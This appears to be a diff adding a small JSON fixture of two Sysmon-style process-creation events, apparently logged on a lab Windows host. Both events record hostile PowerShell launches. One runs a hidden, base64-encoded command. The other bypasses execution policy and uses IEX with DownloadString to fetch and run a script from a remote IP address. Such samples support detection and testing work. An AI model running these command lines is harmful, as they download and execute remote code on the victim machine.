@@ -1,0 +1,4 @@
+[
+  {"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "WIN-EP-01\\labuser", "Computer": "WIN-EP-01", "timestamp": "2026-07-04T10:02:11Z"},
+  {"EventID": 1, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://45.83.90.12/a.ps1')", "ParentImage": "C:\\Windows\\explorer.exe", "User": "WIN-EP-01\\labuser", "Computer": "WIN-EP-01", "timestamp": "2026-07-04T10:02:14Z"}
+]
